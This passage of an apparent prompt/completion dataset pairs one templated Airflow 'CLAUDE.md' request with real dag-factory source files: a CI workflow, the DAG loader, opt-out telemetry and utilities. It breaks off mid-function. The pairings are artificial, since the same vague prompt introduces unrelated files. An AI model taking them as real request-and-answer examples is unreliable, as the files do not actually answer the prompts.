${{ matrix.python-version }}\n        run: |\n          hatch run tests.py${{ matrix.python-version }}-${{ matrix.airflow-version }}:test-cov\n        env:\n          AUTO_CONVERT_TO_AF3: true\n\n      - name: Upload coverage to Github\n        uses: actions/upload-artifact@v4\n        with:\n          name: coverage-unit-test-${{ matrix.python-version }}-${{ matrix.airflow-version }}\n          path: .coverage\n          include-hidden-files: true\n\n  Run-Integration-Tests:\n    needs: Authorize\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.9\", \"3.10\", \"3.11\", \"3.12\"]\n        airflow-version:\n          [\"2.4\", \"2.5\", \"2.6\", \"2.7\", \"2.8\", \"2.9\", \"2.10\", \"2.11\", \"3.0\"]\n        exclude:\n          - python-version: \"3.11\"\n            airflow-version: \"2.4\"\n          - python-version: \"3.11\"\n            airflow-version: \"2.5\"\n          - python-version: \"3.11\"\n            airflow-version: \"2.6\"\n          # Apache Airflow versions prior to 2.9.0 have not been tested with Python 3.12.\n          # Official support for Python 3.12 and the corresponding constraints.txt are available only for Apache Airflow >= 2.9.0.\n          # See: https://github.com/apache/airflow/tree/2.9.0?tab=readme-ov-file#requirements\n          # See: https://github.com/apache/airflow/tree/2.8.4?tab=readme-ov-file#requirements\n          - python-version: \"3.12\"\n            airflow-version: \"2.4\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.5\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.6\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.7\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.8\"\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha || github.ref }}\n          persist-credentials: false\n\n      - uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cache/uv\n            ~/.cache/pip\n            .local/share/hatch/\n          key: integration-${{ runner.os }}-${{ matrix.python-version }}-${{ matrix.airflow-version }}-${{ hashFiles('pyproject.toml') }}-${{ hashFiles('dagfactory/__init__.py') }}\n\n      - name: Install uv\n        uses: astral-sh/setup-uv@e92bafb6253dcd438e0484186d7669ea7a8ca1cc # v6.4.3\n        with:\n          version: \"0.7.12\"\n\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Install packages and dependencies\n        run: |\n          uv tool install hatch\n          hatch -e tests.py${{ matrix.python-version }}-${{ matrix.airflow-version }} run pip freeze\n\n      - name: Test DAG Factory against Airflow ${{ matrix.airflow-version }} and Python ${{ matrix.python-version }}\n        run: |\n          hatch run tests.py${{ matrix.python-version }}-${{ matrix.airflow-version }}:test-integration-setup\n          hatch run tests.py${{ matrix.python-version }}-${{ matrix.airflow-version }}:test-integration\n        env:\n          AIRFLOW__CORE__DAGBAG_IMPORT_TIMEOUT: 90.0\n          AIRFLOW_HOME: ${{ github.workspace }}\n          CONFIG_ROOT_DIR: ${{ github.workspace }}/dags\n          PYTHONPATH: ${{ github.workspace }}:${{ github.workspace }}/dev/dags:$PYTHONPATH\n          AUTO_CONVERT_TO_AF3: true\n\n      - name: Upload coverage to Github\n        uses: actions/upload-artifact@v4\n        with:\n          name: coverage-integration-test-${{ matrix.python-version }}-${{ matrix.airflow-version }}\n          path: .coverage\n          include-hidden-files: true\n\n  Code-Coverage:\n    if: github.event.action != 'labeled'\n    needs:\n      - Run-Unit-Tests\n      - Run-Integration-Tests\n      - Authorize\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha || github.ref }}\n          persist-credentials: false\n\n      - name: Install uv\n        uses: astral-sh/setup-uv@e92bafb6253dcd438e0484186d7669ea7a8ca1cc # v6.4.3\n        with:\n          version: \"0.7.12\"\n\n      - name: Set up Python 3.11\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n\n      - name: Install coverage\n        run: |\n          uv tool install coverage\n      - name: Download all coverage artifacts\n        uses: actions/download-artifact@v4\n        with:\n          path: ./coverage\n      - name: Combine coverage\n        run: |\n          coverage combine ./coverage/coverage*/.coverage\n          coverage report\n          coverage xml\n      - name: Upload coverage to Codecov\n        uses: codecov/codecov-action@18283e04ce6e62d37312384ff67231eb8fd56d24 # v5.4.3\n        with:\n          fail_ci_if_error: true\n          token: ${{ secrets.CODECOV_TOKEN }}\n          files: coverage.xml\n\n  Deploy-Pages:\n    permissions:\n      contents: write\n    runs-on: ubuntu-latest\n    needs:\n      - Static-Check\n      - Run-Unit-Tests\n      - Run-Integration-Tests\n      - Authorize\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha || github.ref }}\n          persist-credentials: true\n\n      - name: Install uv\n        uses: astral-sh/setup-uv@e92bafb6253dcd438e0484186d7669ea7a8ca1cc # v6.4.3\n        with:\n          version: \"0.7.12\"\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.12\"\n          architecture: \"x64\"\n\n      - name: Install packages and dependencies\n        run: uv tool install hatch\n\n      - name: Deploy Docs\n        run: |\n          git config user.name \"oss-integrations-bot\"\n          git config user.email \"oss-integrations-bot@astronomer.io\"\n\n          git fetch origin gh-pages --depth=1\n\n          if [[ $GITHUB_EVENT_NAME == \"release\" ]]; then\n              hatch run docs:gh-release\n          else\n              hatch run docs:gh-deploy\n          fi\n\n  Publish-Package:\n    if: github.event_name == 'release'\n    name: Build and publish Python 🐍 distributions 📦 to PyPI\n    needs:\n      - Static-Check\n      - Run-Unit-Tests\n      - Run-Integration-Tests\n      - Deploy-Pages\n      - Code-Coverage\n      - Authorize\n    runs-on: ubuntu-latest\n    environment:\n      name: pypi\n      url: https://pypi.org/p/dag-factory\n    permissions:\n      id-token: write  # IMPORTANT: this permission is mandatory for trusted publishing\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n\n      - name: Install uv\n        uses: astral-sh/setup-uv@e92bafb6253dcd438e0484186d7669ea7a8ca1cc # v6.4.3\n        with:\n          version: \"0.7.12\"\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.10\"\n          architecture: \"x64\"\n\n      - name: Verify Git Tag and package version\n        run: python3 ./scripts/verify_tag_and_version.py\n      - run: uv build --wheel --sdist\n      - run: uv publish\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": ".github/workflows/cicd.yaml", "language": "yaml", "complexity": "complex", "star_count": 1326, "quality_score": 0.6599999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "TELEMETRY_URL = \"https://astronomer.gateway.scarf.sh/dag-factory/{telemetry_version}/{dagfactory_version}/{airflow_version}/{python_version}/{platform_system}/{platform_machine}/{event_type}/{status}/{dag_hash}/{task_count}\"\nTELEMETRY_VERSION = \"v2\"\nTELEMETRY_TIMEOUT = 1.0\n\nAIRFLOW3_MAJOR_VERSION = 3\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dagfactory/constants.py", "language": "python", "complexity": "simple", "star_count": 1326, "quality_score": 0.39999999999999997, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Module contains code for loading a DagFactory config and generating DAGs\"\"\"\n\nimport logging\nimport os\nfrom itertools import chain\nfrom pathlib import Path\nfrom typing import Any, Dict, List, Optional, Union\n\nimport yaml\nfrom airflow.configuration import conf as airflow_conf\n\ntry:\n    from airflow.sdk.definitions.dag import DAG\nexcept ImportError:\n    from airflow.models import DAG\nfrom airflow.version import version as AIRFLOW_VERSION\nfrom packaging import version\n\nfrom dagfactory.dagbuilder import DagBuilder\nfrom dagfactory.exceptions import DagFactoryConfigException, DagFactoryException\nfrom dagfactory.utils import cast_with_type, update_yaml_structure\n\n# these are params that cannot be a dag name\nSYSTEM_PARAMS: List[str] = [\"default\", \"task_groups\"]\n\n\nclass DagFactory:\n    \"\"\"\n    Takes a YAML config or a python dictionary and generates DAGs.\n\n    :param config_filepath: the filepath of the DAG factory YAML config file.\n        Must be absolute path to file. Cannot be used with `config`.\n    :type config_filepath: str\n    :param config: DAG factory config dictionary. Cannot be used with `config_filepath`.\n    :type config: dict\n    :param default_args_config_path: The path to a file that contains the default arguments for that DAG.\n    :type default_args_config_path: str\n    :param default_args_config_dict: A dictionary of default arguments for that DAG, as an alternative to default_args_config_path.\n    :type default_args_config_dict: dict\n    \"\"\"\n\n    def __init__(\n        self,\n        config_filepath: Optional[str] = None,\n        config: Optional[dict] = None,\n        default_args_config_path: str = airflow_conf.get(\"core\", \"dags_folder\"),\n        default_args_config_dict: Optional[dict] = None,\n    ) -> None:\n        # Handle the config(_filepath)\n        assert bool(config_filepath) ^ bool(config), \"Either `config_filepath` or `config` should be provided\"\n\n        if config_filepath:\n            DagFactory._validate_config_filepath(config_filepath=config_filepath)\n            self.config: Dict[str, Any] = self._load_dag_config(config_filepath=config_filepath)\n        if config:\n            self.config: Dict[str, Any] = config\n\n        # These default args are a bit different; these are not the \"default\" structure that is applied to certain DAGs.\n        # These are in-fact the \"default\" default_args\n        if default_args_config_dict:\n            # Log a warning if the default_args parameter is specified. If both the default_args and\n            # default_args_file_path are passed, we'll throw an exception.\n            logging.warning(\n                \"Manually specifying `default_args_config_dict` will override the values in the `defaults.yml` file.\"\n            )\n\n            if default_args_config_path != airflow_conf.get(\"core\", \"dags_folder\"):\n                raise DagFactoryException(\"Cannot pass both `default_args_config_dict` and `default_args_config_path`.\")\n\n        # We'll still go ahead and set both values. They'll be referenced in _global_default_args.\n        self.default_args_config_path: str = default_args_config_path\n        self.default_args_config_dict: Optional[dict] = default_args_config_dict\n\n    def _global_default_args(self):\n        \"\"\"\n        If self.default_args exists, use this as the global default_args (to be applied to each DAG). Otherwise, fall\n        back to the defaults.yml file.\n        \"\"\"\n        if self.default_args_config_dict:\n            return self.default_args_config_dict\n\n        default_args_yml = Path(self.default_args_config_path) / \"defaults.yml\"\n\n        if default_args_yml.exists():\n            return self._load_dag_config(config_filepath=default_args_yml)\n\n    @staticmethod\n    def _serialise_config_md(dag_name, dag_config, default_config):\n        # Remove empty task_groups if it exists\n        # We inject it if not supply by user\n        # https://github.com/astronomer/dag-factory/blob/e53b456d25917b746d28eecd1e896595ae0ee62b/dagfactory/dagfactory.py#L102\n        if dag_config.get(\"task_groups\") == {}:\n            del dag_config[\"task_groups\"]\n\n        # Convert default_config to YAML format\n        default_config = {\"default\": default_config}\n        default_config_yaml = yaml.dump(default_config, default_flow_style=False, allow_unicode=True, sort_keys=False)\n\n        # Convert dag_config to YAML format\n        dag_config = {dag_name: dag_config}\n        dag_config_yaml = yaml.dump(dag_config, default_flow_style=False, allow_unicode=True, sort_keys=False)\n\n        # Combine the two YAML outputs with appropriate formatting\n        dag_yml = default_config_yaml + \"\\n\" + dag_config_yaml\n\n        return dag_yml\n\n    @staticmethod\n    def _validate_config_filepath(config_filepath: str) -> None:\n        \"\"\"\n        Validates config file path is absolute\n        \"\"\"\n        if not os.path.isabs(config_filepath):\n            raise DagFactoryConfigException(\"DAG Factory `config_filepath` must be absolute path\")\n\n    def _load_dag_config(self, config_filepath: str) -> Dict[str, Any]:\n        \"\"\"\n        Loads DAG config file to dictionary\n\n        :returns: dict from YAML config file\n        \"\"\"\n        # pylint: disable=consider-using-with\n        try:\n\n            def __join(loader: yaml.FullLoader, node: yaml.Node) -> str:\n                seq = loader.construct_sequence(node)\n                return \"\".join([str(i) for i in seq])\n\n            def __or(loader: yaml.FullLoader, node: yaml.Node) -> str:\n                seq = loader.construct_sequence(node)\n                return \" | \".join([f\"({str(i)})\" for i in seq])\n\n            def __and(loader: yaml.FullLoader, node: yaml.Node) -> str:\n                seq = loader.construct_sequence(node)\n                return \" & \".join([f\"({str(i)})\" for i in seq])\n\n            yaml.add_constructor(\"!join\", __join, yaml.FullLoader)\n            yaml.add_constructor(\"!or\", __or, yaml.FullLoader)\n            yaml.add_constructor(\"!and\", __and, yaml.FullLoader)\n\n            with open(config_filepath, \"r\", encoding=\"utf-8\") as fp:\n                config_with_env = os.path.expandvars(fp.read())\n                config: Dict[str, Any] = yaml.load(stream=config_with_env, Loader=yaml.FullLoader)\n                config = cast_with_type(config)\n\n            # This will only invoke in the CI\n            # Make yaml DAG compatible for Airflow 3\n            if version.parse(AIRFLOW_VERSION) >= version.parse(\"3.0.0\") and os.getenv(\"AUTO_CONVERT_TO_AF3\"):\n                config = update_yaml_structure(config)\n\n        except Exception as err:\n            raise DagFactoryConfigException(\"Invalid DAG Factory config file\") from err\n        return config\n\n    def get_dag_configs(self) -> Dict[str, Dict[str, Any]]:\n        \"\"\"\n        Returns configuration for each the DAG in factory\n\n        :returns: dict with configuration for dags\n        \"\"\"\n        return {dag: self.config[dag] for dag in self.config.keys() if dag not in SYSTEM_PARAMS}\n\n    def get_default_config(self) -> Dict[str, Any]:\n        \"\"\"\n        Returns defaults for the DAG factory. If no defaults exist, returns empty dict.\n\n        :returns: dict with default configuration\n        \"\"\"\n        return self.config.get(\"default\", {})\n\n    def build_dags(self) -> Dict[str, DAG]:\n        \"\"\"Build DAGs using the config file.\"\"\"\n        dag_configs: Dict[str, Dict[str, Any]] = self.get_dag_configs()\n        global_default_args = self._global_default_args()\n        default_config: Dict[str, Any] = self.get_default_config()\n\n        # If global_default_args is None, then default_config will remain as is. Otherwise, we'll (try) go ahead and\n        # update the default args using global_default_args\n        if isinstance(global_default_args, dict):\n            # Previously, default_config was being overwritten completely to only container the default_args\n            # key-value pair. This was updated as part of issue-295 to not overwrite the entire default_config\n            # dictionary, and instead update the default_args key-value pair of the default_config dictionary\n            default_config[\"default_args\"] = {\n                **global_default_args.get(\"default_args\", {}),\n                **default_config.get(\"default_args\", {}),\n            }\n\n        dags: Dict[str, Any] = {}\n\n        if isinstance(global_default_args, dict):\n            dag_level_args = {k: v for k, v in global_default_args.items() if k != \"default_args\"}\n        else:\n            dag_level_args = {}\n\n        for dag_name, dag_config in dag_configs.items():\n            # Apply DAG-level default arguments from global_default_args to each dag_config,\n            # this is helpful because some arguments are not supported in default_args.\n            if isinstance(global_default_args, dict):\n                dag_config = {**dag_level_args, **dag_config}\n\n            dag_config[\"task_groups\"] = dag_config.get(\"task_groups\", {})\n            dag_builder: DagBuilder = DagBuilder(\n                dag_name=dag_name,\n                dag_config=dag_config,\n                default_config=default_config,\n                yml_dag=self._serialise_config_md(dag_name, dag_config, default_config),\n            )\n            try:\n                dag: Dict[str, Union[str, DAG]] = dag_builder.build()\n                dags[dag[\"dag_id\"]]: DAG = dag[\"dag\"]\n            except Exception as err:\n                raise DagFactoryException(f\"Failed to generate dag {dag_name}: {err}\") from err\n\n        return dags\n\n    # pylint: disable=redefined-builtin\n    @staticmethod\n    def register_dags(dags: Dict[str, DAG], globals: Dict[str, Any]) -> None:\n        \"\"\"Adds `dags` to `globals` so Airflow can discover them.\n\n        :param dags: Dict of DAGs to be registered.\n        :param globals: The globals() from the file used to generate DAGs. The dag_id\n            must be passed into globals() for Airflow to import\n        \"\"\"\n        for dag_id, dag in dags.items():\n            globals[dag_id]: DAG = dag\n\n    def generate_dags(self, globals: Dict[str, Any]) -> None:\n        \"\"\"\n        Generates DAGs from YAML config\n\n        :param globals: The globals() from the file used to generate DAGs. The dag_id\n            must be passed into globals() for Airflow to import\n        \"\"\"\n        dags: Dict[str, Any] = self.build_dags()\n        self.register_dags(dags, globals)\n\n\ndef load_yaml_dags(\n    globals_dict: Dict[str, Any],\n    dags_folder: str = airflow_conf.get(\"core\", \"dags_folder\"),\n    default_args_config_path: str = airflow_conf.get(\"core\", \"dags_folder\"),\n    suffix=None,\n):\n    \"\"\"\n    Loads all the yaml/yml files in the dags folder\n\n    The dags folder is defaulted to the airflow dags folder if unspecified.\n    And the prefix is set to yaml/yml by default. However, it can be\n    interesting to load only a subset by setting a different suffix.\n\n    :param globals_dict: The globals() from the file used to generate DAGs\n    :param dags_folder: Path to the folder you want to get recursively scanned\n    :param default_args_config_path: The Folder path where defaults.yml exist.\n    :param suffix: file suffix to filter `in` what files to scan for dags\n    \"\"\"\n    # chain all file suffixes in a single iterator\n    logging.info(\"Loading DAGs from %s\", dags_folder)\n    if suffix is None:\n        suffix = [\".yaml\", \".yml\"]\n    candidate_dag_files = []\n    for suf in suffix:\n        candidate_dag_files = list(chain(candidate_dag_files, Path(dags_folder).rglob(f\"*{suf}\")))\n    for config_file_path in candidate_dag_files:\n        config_file_abs_path = str(config_file_path.absolute())\n        logging.info(\"Loading %s\", config_file_abs_path)\n        try:\n            factory = DagFactory(config_file_abs_path, default_args_config_path=default_args_config_path)\n            factory.generate_dags(globals_dict)\n        except Exception:  # pylint: disable=broad-except\n            logging.exception(\"Failed to load dag from %s\", config_file_path)\n        else:\n            logging.info(\"DAG loaded: %s\", config_file_path)\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dagfactory/dagfactory.py", "language": "python", "complexity": "complex", "star_count": 1326, "quality_score": 0.87, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import annotations\n\nfrom airflow.listeners import hookimpl\n\ntry:\n    from airflow.sdk.definitions.dag import DAG\nexcept ImportError:\n    from airflow.models.dag import DAG\nimport hashlib\n\nfrom airflow.models.dagrun import DagRun\nfrom airflow.version import version as AIRFLOW_VERSION\nfrom packaging import version\n\nfrom dagfactory import telemetry\n\nINSTALLED_AIRFLOW_VERSION = version.parse(AIRFLOW_VERSION)\n\n\nclass EventStatus:\n    SUCCESS = \"success\"\n    FAILED = \"failed\"\n\n\nDAG_RUN = \"dag_run\"\n\n\ndef is_dagfactory_dag(dag: DAG | None = None):\n    if \"dagfactory\" in dag.tags:\n        return True\n    return False\n\n\n@hookimpl\ndef on_dag_run_success(dag_run: DagRun, msg: str):\n    dag = dag_run.get_dag()\n    if not is_dagfactory_dag(dag):\n        return\n\n    if INSTALLED_AIRFLOW_VERSION < version.Version(\"3.0.0\"):\n        dag_hash = dag_run.dag_hash\n    else:\n        dag_id_str = str(dag_run.dag_id)\n        dag_hash = hashlib.md5(dag_id_str.encode(\"utf-8\")).hexdigest()\n\n    additional_telemetry_metrics = {\n        \"dag_hash\": dag_hash,\n        \"status\": EventStatus.SUCCESS,\n        \"task_count\": len(dag.task_ids),\n    }\n\n    telemetry.emit_usage_metrics_if_enabled(DAG_RUN, additional_telemetry_metrics)\n\n\n@hookimpl\ndef on_dag_run_failed(dag_run: DagRun, msg: str):\n    dag = dag_run.get_dag()\n    if not is_dagfactory_dag(dag):\n        return\n\n    if INSTALLED_AIRFLOW_VERSION < version.Version(\"3.0.0\"):\n        dag_hash = dag_run.dag_hash\n    else:\n        dag_id_str = str(dag_run.dag_id)\n        dag_hash = hashlib.md5(dag_id_str.encode(\"utf-8\")).hexdigest()\n\n    additional_telemetry_metrics = {\n        \"dag_hash\": dag_hash,\n        \"status\": EventStatus.FAILED,\n        \"task_count\": len(dag.task_ids),\n    }\n\n    telemetry.emit_usage_metrics_if_enabled(DAG_RUN, additional_telemetry_metrics)\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dagfactory/listeners/runtime_event.py", "language": "python", "complexity": "simple", "star_count": 1326, "quality_score": 0.75, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from airflow.plugins_manager import AirflowPlugin\n\nfrom dagfactory.listeners import runtime_event\n\n\nclass DagFactoryPlugin(AirflowPlugin):\n    name = \"Dag Factory Plugin\"\n    listeners = [runtime_event]\n\n\ndagfactory_plugin = DagFactoryPlugin()\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dagfactory/plugin/__init__.py", "language": "python", "complexity": "simple", "star_count": 1326, "quality_score": 0.69, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import annotations\n\nimport os\n\nfrom airflow.configuration import conf\n\n\ndef convert_to_boolean(value: str | None) -> bool:\n    \"\"\"\n    Convert a string that represents a boolean to a Python boolean.\n    \"\"\"\n    value = str(value).lower().strip()\n    if value in (\"f\", \"false\", \"0\", \"\", \"none\"):\n        return False\n    return True\n\n\nenable_telemetry = conf.getboolean(\"dag_factory\", \"enable_telemetry\", fallback=True)\ndo_not_track = convert_to_boolean(os.getenv(\"DO_NOT_TRACK\"))\nno_analytics = convert_to_boolean(os.getenv(\"SCARF_NO_ANALYTICS\"))\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dagfactory/settings.py", "language": "python", "complexity": "simple", "star_count": 1326, "quality_score": 0.75, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import annotations\n\nimport logging\nimport platform\nfrom urllib import parse\nfrom urllib.parse import urlencode\n\nimport httpx\nfrom airflow import __version__ as airflow_version\n\nimport dagfactory\nfrom dagfactory import constants, settings\n\n\ndef should_emit() -> bool:\n    \"\"\"\n    Identify if telemetry metrics should be emitted or not.\n    \"\"\"\n    return settings.enable_telemetry and not settings.do_not_track and not settings.no_analytics\n\n\ndef collect_standard_usage_metrics() -> dict[str, object]:\n    \"\"\"\n    Return standard telemetry metrics.\n    \"\"\"\n    metrics = {\n        \"dagfactory_version\": dagfactory.__version__,\n        \"airflow_version\": parse.quote(airflow_version),\n        \"python_version\": platform.python_version(),\n        \"platform_system\": platform.system(),\n        \"platform_machine\": platform.machine(),\n        \"variables\": {},\n    }\n    return metrics\n\n\ndef emit_usage_metrics(metrics: dict[str, object]) -> bool:\n    \"\"\"\n    Emit desired telemetry metrics to remote telemetry endpoint.\n\n    The metrics must contain the necessary fields to build the TELEMETRY_URL.\n    \"\"\"\n    query_string = urlencode(metrics)\n    telemetry_url = constants.TELEMETRY_URL.format(\n        **metrics, telemetry_version=constants.TELEMETRY_VERSION, query_string=query_string\n    )\n    logging.debug(\"Telemetry is enabled. Emitting the following usage metrics to %s: %s\", telemetry_url, metrics)\n    try:\n        response = httpx.get(telemetry_url, timeout=constants.TELEMETRY_TIMEOUT, follow_redirects=True)\n    except httpx.HTTPError as e:\n        logging.warning(\n            \"Unable to emit usage metrics to %s. An HTTPX connection error occurred: %s.\", telemetry_url, str(e)\n        )\n        is_success = False\n    else:\n        is_success = response.is_success\n        if not is_success:\n            logging.warning(\n                \"Unable to emit usage metrics to %s. Status code: %s. Message: %s\",\n                telemetry_url,\n                response.status_code,\n                response.text,\n            )\n    return is_success\n\n\ndef emit_usage_metrics_if_enabled(event_type: str, additional_metrics: dict[str, object]) -> bool:\n    \"\"\"\n    Checks if telemetry should be emitted, fetch standard metrics, complement with custom metrics\n    and emit them to remote telemetry endpoint.\n\n    :returns: If the event was successfully sent to the telemetry backend or not.\n    \"\"\"\n    if should_emit():\n        metrics = collect_standard_usage_metrics()\n        metrics[\"event_type\"] = event_type\n        metrics[\"variables\"].update(additional_metrics)\n        metrics.update(additional_metrics)\n        is_success = emit_usage_metrics(metrics)\n        return is_success\n    else:\n        logging.debug(\"Telemetry is disabled. To enable it, export AIRFLOW__DAG_FACTORY__ENABLE_TELEMETRY=True.\")\n        return False\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dagfactory/telemetry.py", "language": "python", "complexity": "simple", "star_count": 1326, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Module contains various utilities used by dag-factory\"\"\"\n\nimport ast\nimport importlib.util\nimport json\nimport logging\nimport os\nimport re\nimport sys\nimport types\nfrom datetime import date, datetime, timedelta\nfrom pathlib import Path\nfrom typing import Any, AnyStr, Dict, List, Match, Optional, Pattern, Tuple, Union\n\nimport pendulum\nimport yaml\n\nfrom dagfactory.exceptions import DagFactoryException\n\n\ndef _import_from_string(class_path):\n    \"\"\"Dynamically import a class from a string.\"\"\"\n    try:\n        module_path, class_name = class_path.rsplit(\".\", 1)\n        module = importlib.import_module(module_path)\n        return getattr(module, class_name)\n    except (ImportError, AttributeError) as e:\n        raise ImportError(f\"Could not import '{class_path}': {e}\")\n\n\ndef get_datetime(date_value: Union[str, datetime, date], timezone: str = \"UTC\") -> datetime:\n    \"\"\"\n    Takes value from DAG config and generates valid datetime. Defaults to\n    today, if not a valid date or relative time (1 hours, 1 days, etc.)\n\n    :param date_value: either a datetime (or date), a date string or a relative time as string\n    :type date_value: Uniont[datetime, date, str]\n    :param timezone: string value representing timezone for the DAG\n    :type timezone: str\n    :returns: datetime for date_value\n    :type: datetime.datetime\n    \"\"\"\n    try:\n        local_tz: pendulum.timezone = pendulum.timezone(timezone)\n    except Exception as err:\n        raise DagFactoryException(\"Failed to create timezone\") from err\n    if isinstance(date_value, datetime):\n        return date_value.replace(tzinfo=local_tz)\n    if isinstance(date_value, date):\n        return datetime.combine(date=date_value, time=datetime.min.time()).replace(tzinfo=local_tz)\n    # Try parsing as date string\n    try:\n        return pendulum.parse(date_value).replace(tzinfo=local_tz)\n    except pendulum.parsing.exceptions.ParserError:\n        # Try parsing as relative time string\n        rel_delta: timedelta = get_time_delta(date_value)\n        now: datetime = datetime.today().replace(hour=0, minute=0, second=0, microsecond=0).replace(tzinfo=local_tz)\n        if not rel_delta:\n            return now\n        return now - rel_delta\n\n\ndef get_time_delta(time_string: str) -> timedelta:\n    \"\"\"\n    Takes a time string (1 hours, 10 days, etc.) and returns\n    a python timedelta object\n\n    :param time_string: the time value to convert to a timedelta\n    :type time_string: str\n    :returns: datetime.timedelta for relative time\n    :type datetime.timedelta\n    \"\"\"\n    # pylint: disable=line-too-long\n    rel_time: Pattern = re.compile(\n        pattern=r\"((?P<hours>\\d+?)\\s+hour)?((?P<minutes>\\d+?)\\s+minute)?((?P<seconds>\\d+?)\\s+second)?((?P<days>\\d+?)\\s+day)?\",\n        # noqa\n        flags=re.IGNORECASE,\n    )\n    parts: Optional[Match[AnyStr]] = rel_time.match(string=time_string)\n    if not parts:\n        raise DagFactoryException(f\"Invalid relative time: {time_string}\")\n    # https://docs.python.org/3/library/re.html#re.Match.groupdict\n    parts: Dict[str, str] = parts.groupdict()\n    time_params = {}\n    if all(value is None for value in parts.values()):\n        raise DagFactoryException(f\"Invalid relative time: {time_string}\")\n    for time_unit, magnitude in parts.items():\n        if magnitude:\n            time_params[time_unit]: int = int(magnitude)\n    return timedelta(**time_params)\n\n\ndef merge_configs(config: Dict[str, Any], default_config: Dict[str, Any]) -> Dict[str, Any]:\n    \"\"\"\n    Merges a `default` config with DAG config. Used to set default values\n    for a group of DAGs.\n\n    :param config: config to merge in default values\n    :type config:  Dict[str, Any]\n    :param default_config: config to merge default values from\n    :type default_config: Dict[str, Any]\n    :returns: dict with merged configs\n    :type: Dict[str, Any]\n    \"\"\"\n    for key in default_config:\n        if key in config:\n            if isinstance(config[key], dict) and isinstance(default_config[key], dict):\n                merge_configs(config[key], default_config[key])\n        else:\n            config[key]: Any = default_config[key]\n    return config\n\n\ndef get_python_callable(python_callable_name, python_callable_file):\n    \"\"\"\n    Uses python filepath and callable name to import a valid callable\n    for use in PythonOperator.\n\n    :param python_callable_name: name of python callable to be imported\n    :type python_callable_name:  str\n    :param python_callable_file: absolute path of python file with callable\n    :type python_callable_file: str\n    :returns: python callable\n    :type: callable\n    \"\"\"\n\n    if not os.path.isabs(python_callable_file):\n        raise DagFactoryException(\"`python_callable_file` must be absolute path\")\n\n    python_file_path = Path(python_callable_file).resolve()\n    module_name = python_file_path.stem\n    spec = importlib.util.spec_from_file_location(module_name, python_callable_file)\n    module = importlib.util.module_from_spec(spec)\n    spec.loader.exec_module(module)\n    sys.modules[module_name] = module\n    python_callable = getattr(module, python_callable_name)\n\n    return python_callable\n\n\ndef get_python_callable_lambda(lambda_expr):\n    \"\"\"\n    Uses lambda expression in a string to create a valid callable\n    for use in operators/sensors.\n\n    :param lambda_expr: the lambda expression to be converted\n    :type lambda_expr:  str\n    :returns: python callable\n    :type: callable\n    \"\"\"\n\n    tree = 